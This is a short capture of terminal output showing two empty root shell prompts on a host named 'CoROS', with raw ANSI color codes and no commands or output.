[01;31mroot@CoROS[00m:[01;34m/[00m#                                                                  [01;31mroot@CoROS[00m:[01;34m/[00m# 